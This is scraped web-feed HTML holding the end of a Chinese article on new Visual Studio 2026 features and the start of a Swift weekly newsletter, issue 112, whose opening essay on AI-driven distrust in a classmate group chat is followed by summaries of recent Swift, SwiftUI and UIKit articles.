<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7459cdb5d681409bbd6984b9151b26ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=nBqa4gwp7pJMQRzVRYdFA6VBz0o%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">更好的 Copilot 响应</h3>
<p>Copilot Chat 的代码搜索能力现已增强，能提供更相关的结果。借助对代码库的远程索引，它在检索与行为、概念或功能相关的代码片段时，建议更加精准。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46d98a16a4454f4c98e049a7bdf386a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=tlVjSsTb2q4OiFBnxm3a%2F8PcPTE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">外部符号识别能力</h3>
<p>现在，Copilot Chat 能够超越当前项目，识别 C# 中由依赖项引入的外部符号，凭借更广泛的理解，为你提供更有效的解决方案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bf87bc4095647faad224a9c22f22b8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=R6H6pniMQv5PJHRJ7lpW8oNWUmc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">行号引用更准确</h3>
<p>现在，当你引用代码中的特定行时，Copilot Chat 能提供更精准的响应用自然语言提问，它就能更准确地理解并回应相关内容。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a51842962b9c4099bcd06077c535bbe1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=elue4Umwl4aQ%2B7Isui59ac4iBO0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">Copilot Chat 中的 Git 上下文</h3>
<p>Copilot Chat 现在支持在 Git 更改窗口中引用你的提交和更改。你可以请求 Copilot 总结你的更改、解释某个特定提交等内容！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c14b2efb307845edb553f262a498db37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=BTvjz9tQyMRjlz0xxC1SCmSVvck%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99ba2fd0edd148d9a01e0ca2d00811f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=npxREJatqH5JC2OaHro7LCVUaxs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">项目和扩展完全兼容</h2>
<p>当前 Visual Studio 2026 完全兼容你现有的 Visual Studio 2022 项目和扩展。打开你的解决方案，立刻就能开始编码无需任何迁移步骤，毫无意外。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3154d425126e4bc5b3eecb5827ba8ddc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=TWixf%2Bnv5ZQkT0WNEV42I2eixgQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">工具 UI 风格变化</h2>
<p>Visual Studio 2026 与 Fluent UI 设计系统保持一致，实现了更加现代化和统一的界面风格，使整体视觉效果更加简洁清爽。</p>
<p>除了更新的设计语言之外，还推出了 11 个新的有色主题，使用户能够更好地控制其开发环境的外观。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ffad7c6ac2e444bacfdef512c7895e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=xii1%2BspBWWTnyRoVMqlurN6A5fY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/415f4a2dd2f640baaf94746f65e93df2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=wkj1rBKrgXbrpypDcyOZn4insKc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2c6ff7c59b14770834f4ec6883c9a48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=udkZ0MgHDsMKUKt%2FMFCcUeOQF04%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">NET 10 和 C# 14 支持</h2>
<p>在 Visual Studio 2026 最新版本中现已全面支持 .NET 10 和 C# 14！这意味着你可以立即畅享最新的语言特性、性能优化和框架增强，无需任何额外设置或配置。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f95597b632e444f08de2684ea1224512~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=2DdU%2FQmaM%2Bp%2BEoORSqgLTiu3Em4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">更多 Visual Studio 2026 实用功能</h2>
<ul>
<li><strong>Visual Studio 2026 发行说明：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Flearn.microsoft.com%2Fzh-cn%2Fvisualstudio%2Freleases%2F2026%2Frelease-notes" target="_blank" title="https://learn.microsoft.com/zh-cn/visualstudio/releases/2026/release-notes" ref="nofollow noopener noreferrer">learn.microsoft.com/zh-cn/visua…</a></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af1581e650b548e6b53f054672ff8486~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=r66ToX2m0Il7S970Z%2BToRJAn%2FAg%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Visual Studio 实用功能：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYSGStudyHards%2FDotNetGuide" target="_blank" title="https://github.com/YSGStudyHards/DotNetGuide" ref="nofollow noopener noreferrer">github.com/YSGStudyHar…</a></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad698281cb54134937baa79d1c4ea2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=n9P4tVyTw1vqId%2F2gwtz5aCf%2Bjg%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[毕业 30 年同学群：一场 AI 引发的“真假难辨”危机 -- 肘子的 Swift 周报 #112]]></title>    <link>https://juejin.cn/post/7576187677838475279</link>    <guid>https://juejin.cn/post/7576187677838475279</guid>    <pubDate>2025-11-24T23:51:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576187677838475279" data-draft-id="7575065455075475491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="毕业 30 年同学群：一场 AI 引发的“真假难辨”危机  -- 肘子的 Swift 周报 #112"/> <meta itemprop="keywords" content="Swift,SwiftUI,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T23:51:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="东坡肘子"/> <meta itemprop="url" content="https://juejin.cn/user/1548526032528727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            毕业 30 年同学群：一场 AI 引发的“真假难辨”危机  -- 肘子的 Swift 周报 #112
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1548526032528727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    东坡肘子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T23:51:27.000Z" title="Mon Nov 24 2025 23:51:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/825f9dec5f7b407fa3bc49548808c5c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lic5Z2h6IKY5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764633087&amp;x-signature=GZTW623sVjLNlKGcsOtux%2FKVS3s%3D" alt="issue112.webp" loading="lazy"/></p>
<h2 data-id="heading-0">毕业 30 年同学群：一场 AI 引发的“真假难辨”危机</h2>
<p>大学毕业快三十年了，同学们大多忙于事业与生活，群里常年冷清。但上周四晚上，一阵久违的热闹突然打破了沉寂。</p>
<p>一位十几年未露面的同学重新加入群聊，说家里遭遇了变故，向大家求助。很快就有人提出质疑——这真的是本人吗？毕竟群里多数人从事法律相关工作，职业敏感度让他们对任何异常格外警觉。</p>
<p>语音通话、视频聊天，一轮轮验证下来，仍有人不放心：“现在 AI 造假太容易了，光凭这些可不够。”直到更多细节被摆上桌面——共同经历、内部昵称、只有我们知道的旧梗——大家才最终确认身份，随即伸出援手，帮助他度过暂时的难关。</p>
<p>严格来说，并不能怪大家变得多疑。在如今一部手机就能“换头”“变声”的时代，“眼见为实”早已不再成立。社交媒体上布满了由 AI 生成的各种离奇情景，人们对“离谱视频”的耐受度不断被拉高：谁家的宠物不会说话、做饭呢？也许哪天真看到 UFO 降落，都不会再令人惊讶——我们对未知的恐惧阈值，正在被悄悄重塑。</p>
<p>随之而来的，是一种新的信息焦虑：过去担心的是获取不及时、不全面；如今担心的是获取的内容是否真实。“可信来源”，正在变成一件稀缺品。</p>
<p>当然，这一切不能算在 AI 头上。AI 本质上只是工具，真正利用它造假、行骗的仍然是人，只是欺骗的方式变了、成本更低了。</p>
<p>在这种背景下，重拾真实与信任，只会变得愈发困难。 或许，最终仍需“魔法打败魔法”：数字签名、可信时间戳、区块链验证……它们未必是完美解法，但至少是值得探索的方向。</p>
<p>从小我母亲就常说：“从善如登，从恶如崩”。</p>
<p>信任亦如此——重建远比摧毁艰难，却也正因如此才显得格外珍贵。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-112%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-112/" ref="nofollow noopener noreferrer">本期内容</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-111%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-111/" ref="nofollow noopener noreferrer">前一期内容</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2F" target="_blank" title="https://fatbobman.com/zh/weekly/" ref="nofollow noopener noreferrer">全部周报列表</a></p>
<blockquote>
<p>🚀 <strong>《肘子的 Swift 周报》</strong></p>
<p>每周为你精选最值得关注的 Swift、SwiftUI 技术动态</p>
<ul>
<li><strong>📮 立即订阅</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fweekly.fatbobman.com%2Ffatbobman" target="_blank" title="https://weekly.fatbobman.com/fatbobman" ref="nofollow noopener noreferrer">weekly.fatbobman.com</a> 获取完整内容</li>
<li><strong>👥 加入社区</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Finvite%2F7FedN5E2QQ" target="_blank" title="https://discord.com/invite/7FedN5E2QQ" ref="nofollow noopener noreferrer">Discord</a> 与 2000+ 开发者交流</li>
<li><strong>📚 深度教程</strong> | <a href="https://link.juejin.cn?target=http%3A%2F%2Ffatbobman.com" target="_blank" title="http://fatbobman.com" ref="nofollow noopener noreferrer">fatbobman.com</a> 探索 200+ 原创文章</li>
</ul>
</blockquote>
<h2 data-id="heading-1">近期推荐</h2>
<h3 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fposts%2Fdeep-dive-into-imessage%2F%3Futm_source%3Dfatbobman%2520weekly%2520issue%2520112%26utm_medium%3Dweb" target="_blank" title="https://fatbobman.com/zh/posts/deep-dive-into-imessage/?utm_source=fatbobman%20weekly%20issue%20112&amp;utm_medium=web" ref="nofollow noopener noreferrer">深入 iMessage 底层：一个 Agent 是如何诞生的</a></h3>
<p>作为 Apple 生态的开发者，我们常常会面对一个微妙的悖论：系统本身具备强大的能力，但这些能力并不一定以公开 API 的形式向开发者开放。iMessage 正是其中的典型 —— 它深度融入 iOS 与 macOS，是用户日常沟通的核心载体，却始终没有提供可供开发者使用的自动化接口。<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fphoton-hq%2Fimessage-kit%3Futm_source%3Dfatbobman%2520weekly%2520issue%2520112%26utm_medium%3Dweb" target="_blank" title="https://github.com/photon-hq/imessage-kit?utm_source=fatbobman%20weekly%20issue%20112&amp;utm_medium=web" ref="nofollow noopener noreferrer">imessage-kit</a> 的作者 <a href="https://link.juejin.cn?target=https%3A%2F%2Fel5.net%2F%40lingjue" target="_blank" title="https://el5.net/@lingjue" ref="nofollow noopener noreferrer">LingJueYa</a>，分享他在构建这一工具时的探索路径。但其核心挑战几乎都来自 Apple 平台本身：解析以 2001 为纪元的时间戳、从二进制 plist 中恢复 NSAttributedString 内容、在 macOS 的沙盒体系下安全地读取资源、以及与 AppleScript 这种历史悠久的自动化机制打交道。</p>
<hr/>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-01" target="_blank" title="https://l.fatbobman.com/w0112-01" ref="nofollow noopener noreferrer">SwiftUI 已死? UIKit 的回归之路 (2025: The Year SwiftUI Died)</a></h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fjacobtechtavern" target="_blank" title="https://x.com/jacobtechtavern" ref="nofollow noopener noreferrer">Jacob Bartlett</a> 的这篇文章标题颇具挑衅意味，他提出了一个值得讨论的观点：2025 年也许是 SwiftUI 的拐点，而不是它的巅峰。核心论点在于，苹果将 <code>@Observable</code> 宏和 <code>updateProperties()</code> 方法引入 UIKit，使其具备了现代化的状态管理能力；同时，AI 辅助编程工具的成熟极大降低了编写 UIKit 代码的成本（而 AI 对 SwiftUI 这种声明式范式的理解仍显不足）。</p>
<blockquote>
<p>苹果对 SwiftUI 的长期投入不会动摇，尤其考虑到它在多端适配上的天然优势。与此同时，AI 的普及也让许多以 SwiftUI 入门的开发者更容易使用 UIKit 来补齐性能或能力上的不足。选择不一定要非此即彼，可以将两者结合起来用得更好。 这样更好吧</p>
</blockquote>
<hr/>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-02" target="_blank" title="https://l.fatbobman.com/w0112-02" ref="nofollow noopener noreferrer">UIKit 中的视图自动刷新 (Automatic property observation in UIKit with @Observable)</a></h3>
<p>UIKit 在 iOS 26 中正式引入了对 Swift Observation 的原生支持。当你在 <code>updateProperties()</code>中读取 <code>@Observable</code> 对象的属性时，UIKit 会自动追踪这些依赖关系，并在数据变化时按需刷新对应视图。<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fnatpanferova" target="_blank" title="https://x.com/natpanferova" ref="nofollow noopener noreferrer">Natalia Panferova</a> 通过一个混合 UIKit + SwiftUI 的实际案例展示了这一特性在跨框架数据共享时的便利性。文章还介绍了 iOS 18 的向下兼容方案：在 <code>Info.plist</code> 中添加 <code>UIObservationTrackingEnabled</code> 键，并将更新逻辑放在 <code>viewWillLayoutSubviews()</code> 中即可实现相同效果。</p>
<hr/>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-03" target="_blank" title="https://l.fatbobman.com/w0112-03" ref="nofollow noopener noreferrer">SwiftData 对 AttributedString 的原生支持 (How SwiftData Represents AttributedString in Core Data Storage)</a></h3>
<p>尽管 AttributedString 本身符合 Codable，但过去开发者并不能直接在 SwiftData 模型中将其作为属性使用。这一限制终于在 iOS 26 中被解除 —— 苹果显然为它开了一条“特别通道”，如今它已经可以像 Int、String 这样的基础类型一样直接存储了。<a href="https://link.juejin.cn?target=https%3A%2F%2Fapps.apple.com%2Fus%2Fapp%2Fid6737813684" target="_blank" title="https://apps.apple.com/us/app/id6737813684" ref="nofollow noopener noreferrer">DataScout for SwiftData</a>（SwiftData 数据库分析应用）的作者 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.linkedin.com%2Fin%2Foleksii-oliinyk-83482995%2F" target="_blank" title="https://www.linkedin.com/in/oleksii-oliinyk-83482995/" ref="nofollow noopener noreferrer">Oleksii Oliinyk</a> 在维护工具时遭遇了相关的崩溃问题，并顺势深入分析了其背后的实现机制。</p>
<blockquote>
<p>SwiftData 允许开发者将符合 Codable 协议的类型作为模型属性，这本身是一项十分强大的能力。但它的底层处理方式可能与许多人预想的并不相同。我在《<a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fposts%2Fconsiderations-for-using-codable-and-enums-in-swiftdata-models%2F" target="_blank" title="https://fatbobman.com/zh/posts/considerations-for-using-codable-and-enums-in-swiftdata-models/" ref="nofollow noopener noreferrer">在 SwiftData 模型中使用 Codable 和枚举的注意事项</a>》中对 SwiftData 的 Codable 转换逻辑与潜在陷阱做了更系统的介绍。此外，如果你需要在 iOS 26 之前保存 AttributedString，可以参考苹果开发者论坛上的这个<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fforums%2Fthread%2F762438" target="_blank" title="https://developer.apple.com/forums/thread/762438" ref="nofollow noopener noreferrer">帖子</a>。</p>
</blockquote>
<hr/>
<h3 data-id="heading-6"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-04" target="_blank" title="https://l.fatbobman.com/w0112-04" ref="nofollow noopener noreferrer">AnyLanguageModel:统一 Apple 平台的 LLM 接口 (Introducing AnyLanguageModel: One API for Local and Remote LLMs on Apple Platforms)</a></h3>
<p>AnyLanguageModel 是由 <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmattt" target="_blank" title="https://x.com/mattt" ref="nofollow noopener noreferrer">Mattt</a> 开发的统一 Swift 大模型接口库，我们已在<a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-109%2F%23anylanguagemodel---%25E7%25BB%259F%25E4%25B8%2580-swift-%25E5%25A4%25A7%25E6%25A8%25A1%25E5%259E%258B%25E5%25BC%2580%25E5%258F%2591%25E8%258C%2583%25E5%25BC%258F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-109/#anylanguagemodel---%E7%BB%9F%E4%B8%80-swift-%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BC%80%E5%8F%91%E8%8C%83%E5%BC%8F" ref="nofollow noopener noreferrer">第 109 期周报</a>中介绍过其核心理念。该库以 Foundation Models 的 API 设计为基础，在保持开发者熟悉的使用方式的同时，统一支持多种模型提供方，包括本地模型（Core ML、MLX、llama.cpp、Ollama）以及云端模型（OpenAI、Anthropic、Google Gemini 等），大幅降低了跨 API、跨运行方式所带来的集成负担，也让探索开源模型变得更容易。</p>
<p>在这篇文章中，Mattt 进一步介绍了 AnyLanguageModel 的设计思路、跨后端的能力抽象及 Swift 6.1 package traits 在控制依赖体积中的作用。值得一提的是，尽管苹果当前尚未在 Foundation Models 中提供图像输入能力，AnyLanguageModel 已为 Claude 等模型补上这一功能，使视觉-语言场景也能在 Apple 平台上顺利落地。</p>
<hr/>
<h3 data-id="heading-7">Approachable Concurrency 与 MainActor by Default</h3>
<p>无论最终走向如何，Swift 6.2 中引入的 <em>Approachable Concurrency</em> 注定会在 Swift 发展史上留下浓重的一笔。它在某些场景下显著降低了并发编程的心智负担，但也让不少开发者感到“越解释越困惑”。</p>
<ul>
<li>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-05" target="_blank" title="https://l.fatbobman.com/w0112-05" ref="nofollow noopener noreferrer">Approachable Concurrency in Swift 6.2: A Clear Guide</a> 一文中，<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Ftwannl" target="_blank" title="https://x.com/twannl" ref="nofollow noopener noreferrer">Antoine van der Lee</a> 中对相关提案和新行为进行了系统梳理。</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmastodon.social%2F%40mattiem" target="_blank" title="https://mastodon.social/@mattiem" ref="nofollow noopener noreferrer">Matt Massicotte</a> 在对这些功能进行了详尽研究和分享后，他在最新文章 <a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-06" target="_blank" title="https://l.fatbobman.com/w0112-06" ref="nofollow noopener noreferrer">MainActor by Default</a> 中强调：至少在现阶段，他不会在项目中启用 Default actor isolation = MainActor，因为“理解为何需要 MainActor，要比理解为何删除它更容易”。</li>
<li>不过有一点已经十分明确：MainActor by Default 与嵌入式平台非常契合。在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-07" target="_blank" title="https://l.fatbobman.com/w0112-07" ref="nofollow noopener noreferrer">Embedded Swift Improvements Coming in Swift 6.3</a> 一文中，<a href="https://link.juejin.cn?target=https%3A%2F%2Fsfba.social%2F%40dgregor79" target="_blank" title="https://sfba.social/@dgregor79" ref="nofollow noopener noreferrer">Doug Gregor</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhachyderm.io%2F%40rauhul" target="_blank" title="https://hachyderm.io/@rauhul" ref="nofollow noopener noreferrer">Rauhul Varma</a> 则进一步展示了 Swift 6.3 在嵌入式平台上的改进方向与动机。</li>
</ul>
<hr/>
<h3 data-id="heading-8"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-08" target="_blank" title="https://l.fatbobman.com/w0112-08" ref="nofollow noopener noreferrer">构建可扩展的白标 iOS 应用 (How to Build Scalable White-Label iOS Apps: From Multi-Target to Modular Architecture)</a></h3>
